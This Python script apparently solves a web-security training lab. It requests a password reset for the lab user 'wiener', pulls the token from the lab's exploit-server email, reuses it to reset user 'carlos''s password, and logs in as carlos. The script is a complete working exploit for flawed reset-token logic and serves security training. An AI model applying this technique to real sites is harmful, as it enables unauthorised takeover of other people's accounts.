import requests
import time
import sys
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
forgot_url = burp_url + '/forgot-password'
#mail_url = burp_url + '/email'
login_url = burp_url + '/login'

burp_data = {"username": "wiener"}
requests.post(forgot_url, data=burp_data)
time.sleep(1)
response = requests.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
mail_raw = match.group(0)
mail_url = mail_raw + '/email'
response = requests.get(mail_url)
match = re.search(r'=([a-z0-9]{32})', response.text)
token = match.group(1)

last_url = burp_url + '/forgot-password?temp-forgot-password-token=' + token
burp_data = {"temp-forgot-password-token": token, "username": "carlos", "new-password-1": "1234567890", "new-password-2": "1234567890"}
requests.post(last_url, data=burp_data)

burp_data = {"username": "carlos", "password":"1234567890"}
r = requests.post(login_url, data=burp_data)
print(r.text)
